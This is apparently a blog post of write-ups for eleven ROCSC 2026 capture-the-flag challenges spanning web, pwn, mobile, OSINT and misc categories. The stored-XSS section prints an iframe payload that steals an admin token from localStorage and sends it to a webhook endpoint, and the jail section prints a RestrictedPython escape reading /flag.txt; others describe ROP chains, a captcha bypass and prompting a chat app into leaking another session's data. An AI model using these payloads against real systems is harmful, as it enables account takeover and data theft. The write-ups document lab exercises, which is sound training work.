---
title: "ROCSC 2026 — CTF Write-Up"
date: 2026-02-26 12:00:00 +0200
tags: [CTF, ROCSC2026]
categories: [CTF, Writeups]
---

## Overview

This post covers selected solved challenges from **ROCSC 2026** only the ones with interesting exploitation paths or creative problem-solving. Simple OSINT challenges (reverse image search, basic profile lookups) are omitted.

---

## 1. open-tellmewhy — Web

**Category:** Web · **Vulnerability:** Stored XSS

### Summary

A Stored Cross-Site Scripting (Stored XSS) vulnerability triggered through the "Report Chat" / "Report to Admin" functionality. The payload injected in a chat message was stored server-side and executed in the administrator's browser context when they reviewed the report.

### Solution

1. Created a new account and authenticated into the application.
2. During reconnaissance, identified the application version as **v0.6.5**.
3. Tested multiple XSS payloads until an `<iframe>`-based one worked:

```html
<iframe src="/api/v1/files/" onload="fetch('https://webhook.site/<REDACTED>/?t='+localStorage.getItem('token'))"></iframe>
```

4. Sent the malicious message via chat and **reported it to the administrator**.
5. When the admin viewed the report, the payload executed in their session context, extracting the authentication token from `localStorage` and sending it to a controlled webhook endpoint.
6. Using the admin token, accessed privileged functionality and found the real flag among several false flags in the archives section.

---

## 2. session-gpt — Web

**Category:** Web · **Vulnerability:** Broken Session Isolation / Information Disclosure

### Summary

The challenge exploited faulty session isolation and unintentional session ID disclosure in a chat-based system.

### Solution

1. Created an account and analyzed the session token — brute-force and pattern prediction both failed.
2. Through repeated interactions and session-related messages, the application unexpectedly returned **a full list of existing sessions** with their IDs and message counts.
3. Tested each session using the `show [SESSION]` command. Session `m3n4o5p6` returned `authguard`, indicating it was significant.
4. Switched to that session and crafted a specific prompt explicitly requesting the SHA256 value between `{}` from a previous message in the conversation.
5. The system disclosed the hash — which was the flag.

---

## 3. ropy — Pwn

**Category:** Pwn · **Vulnerability:** Buffer Overflow + ROP Chain

### Summary

A buffer overflow in a 64-bit stripped ELF binary, exploited via multi-stage ROP chains to bypass protections and read `flag.txt` through syscalls.

### Solution

The exploit was built in **three stages**:

**Stage 1 — Libc Leak:**
Leveraged the `gets()` buffer overflow to call `puts()` on its own GOT entry, leaking a libc address and calculating the libc base.

**Stage 2 — Stack Leak:**
Read the `environ` symbol to leak a stack address, then computed safe stack locations for multiple buffers.

**Stage 3 — Double-Buffered ROP Chain:**
Constructed a complex ROP chain using libc gadgets (`pop rdi`, `pop rsi`, `pop rdx`, `syscall`) to:
- `sys_open` → open `flag.txt`
- `sys_read` → iterate through file descriptors (4096–28673) to find the right one
- `sys_write` → output the flag to stdout

---

## 4. jail — Pwn

**Category:** Pwn · **Vulnerability:** RestrictedPython Sandbox Escape

### Summary

A Python sandbox using RestrictedPython blocked dangerous numpy functions (`fromfile`, `load`, `save`) but didn't cover all numpy submodules.

### Solution

1. The sandbox blocked `np.fromfile` from the main numpy module.
2. Discovered that `np.rec` (numpy records submodule) has its own `fromfile` method that **was not blocked**.
3. Payload:

```python
raise Exception(np.rec.fromfile("/flag.txt", dtype=np.uint8).tobytes())
```

This reads `flag.txt` as a byte array, converts it via `tobytes()`, and forces output through an exception message — bypassing both the function blocklist and output restrictions.

---

## 5. Clanker Casino — Web

**Category:** Web · **Vulnerability:** Font-Based Captcha Bypass

### Summary

A coin-flip game protected by a visual captcha that uses a custom font with GSUB (glyph substitution) tables. The equation in the HTML source differs from what is visually rendered in the browser.

### Solution

1. Downloaded the custom font `editundo.ttf` from the server.
2. Analyzed the font and found that GSUB tables remap digit glyphs — e.g., the HTML `00+00` renders visually as `47+31`.
3. Used the **uharfbuzz** library to apply font shaping on the HTML content:
   - Extracted substituted glyph names (e.g., `"four"`, `"seven"`)
   - Converted glyph names back to digits to reconstruct the **real visual equation**
   - Computed the correct answer with `eval()`
4. Automated the entire process: create new accounts, solve captchas programmatically, and gamble recursively until reaching **200 coins** to unlock the flag.

---

## 6. echoes_of_the_past — OSINT

**Category:** OSINT · **Vulnerability:** Audio Steganography + Wayback Machine

### Summary

An audio file contained a binary-encoded message hidden in echo patterns. The decoded message pointed to an archived website on the Wayback Machine.

### Solution

1. Analyzed `past_echoes.wav` and observed echo patterns in the audio.
2. Decoded the echoes:
   - **Instant echo** → bit `0`
   - **1-second delayed echo** → bit `1`
3. The decoded binary string yielded: `gotorocsc.roinpast`
4. Ran `strings` on the file, revealing the hidden date: **6 07 2022**
5. Accessed `rocsc.ro` on the **Wayback Machine** at **July 6, 2022**, and found a user `demo`.
6. Applied `SHA256("demo")` → flag.

---

## 7. Avault — Mobile

**Category:** Mobile · **Vulnerability:** Hardcoded Credentials

### Summary

An Android vault application where access was protected by a locally-implemented authentication/encryption mechanism. The key/password was hardcoded in the application code, and parameters like the salt were stored in resource files.

### Solution

1. Decompiled the APK using **Jadx** and analyzed the classes responsible for authentication and key derivation.
2. Found the password required for unlocking was **hardcoded** in the source.
3. The salt used in the security scheme was read from resources:
   ```
   salt (from security.xml): 8uOT9OHUHNLoqjpOelb2Gw==
   ```
4. Used the extracted credentials to unlock the vault and retrieve the flag.

---

## 8. directory — Pwn

**Category:** Pwn · **Vulnerability:** Buffer Overflow (Partial Overwrite)

### Summary

A buffer overflow in an ELF binary managing a name directory, allowing a partial overwrite of the return address on the stack.

### Solution

1. Analyzed the binary — the function adding names to the directory didn't properly validate input size.
2. The 10th directory slot sits at `rbp - 0x20` on the stack.
3. Filled the first 9 entries with dummy data to advance the directory index.
4. On the **10th entry**, sent:
   - **40 bytes** of padding
   - **`\x38`** to overwrite only the **LSB** (least significant byte) of the return address
5. This redirected execution to the `win()` function.
6. Selected exit from the menu → `process_menu()` returned, popping the modified address → `win()` executed → flag.

---

## 9. y — Web

**Category:** Web · **Vulnerability:** CSS/HTML Injection → XSS

### Summary

A web challenge where CSS injection in user input could be escalated to JavaScript execution in the admin bot's context. The bot had access to internal routes (including localhost).

### Solution

1. Identified that the application allows injection in CSS context (e.g., via `* { cursor: url(...) }` patterns).
2. The admin bot processes/renders the content in a context where quotes can be escaped and tags can be closed to inject arbitrary HTML/JS.
3. Crafted a payload that:
   - Breaks out of the CSS context
   - Injects a `<script>` tag
   - Uses `fetch()` to read the sensitive `/settings` endpoint
   - Exfiltrates the data (username/token) to a controlled endpoint

---

## 10. art-gallery-heist v2 — OSINT

**Category:** OSINT · **Vulnerability:** NFT Metadata Correlation

### Summary

An OSINT challenge requiring identification of an artwork from a digital gallery. Clues led to an NFT collection, and the flag was found by correlating the token ID with the creator's account.

### Solution

1. Performed a **reverse image search** on the provided image.
2. The results led to an **NFT collection** containing the same artwork.
3. Extracted the **token/artwork ID** and the **associated username** from the collection page.
4. Searched for the username on public platforms (social media / NFT marketplaces).
5. Found the profile where the flag was present in the bio/posts.

---

## 11. Chimera Void — Misc

**Category:** Misc · **Vulnerability:** G-code Steganography

### Summary

A G-code file (used for 3D printers / CNC machines) where the flag was not visible in the raw text but was "drawn" by the toolpath trajectories defined in the code.

### Solution

1. Analyzed the provided file and identified G-code instructions (`G0`, `G1`, `X/Y/Z` coordinates).
2. Loaded the G-code into an online viewer such as [ncviewer.com](https://ncviewer.com).
3. After rendering, the toolpaths clearly spelled out the flag text in the work plane.
